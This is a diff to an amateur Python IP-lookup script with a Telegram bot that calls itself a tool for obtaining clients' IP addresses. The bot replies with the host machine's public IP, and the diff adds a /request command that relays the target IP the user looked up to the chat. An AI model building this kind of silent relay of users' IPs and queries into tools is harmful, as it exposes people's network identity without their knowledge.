@@ -3,6 +3,7 @@ import folium
 import bs4
 import requests
 import time
+from tkinter import messagebox
 
 s = requests.get('https://2ip.ua/ru/')
 
@@ -63,10 +64,10 @@ def get_info_by_ip(ip='127.0.0.1'):
     except requests.exceptions.ConnectionError:
         print('[!] Please check your connection!')
 
-
 def main():
     preview_text = Figlet(font='slant')
     print(preview_text.renderText('IP INFO'))
+    messagebox.showinfo("IP", f"Ваш IP: {a}")
     ip = input('Please enter a target IP: ')
 
     get_info_by_ip(ip=ip)
@@ -79,17 +80,15 @@ def main():
 
             if get_message_text(upd).lower() == "/ip":
                 send_message(get_chat_id(upd), f"IP клієнта: {a}")
-
             elif get_message_text(upd).lower() == "/start":
                 send_message(get_chat_id(upd),
                              "Я Бот для отримання IP адресів клієнтів")
-
-
-
+            elif get_message_text(upd).lower() == "/request":
+                send_message(get_chat_id(upd),
+                             f"Запит клієнта: {ip}")
             elif get_message_text(upd).lower() == "/help":
                 send_message(get_chat_id(upd),
                              "Я Бот для отримання IP адресів клієнтів")
-
             else:
                 send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
             up_id += 1
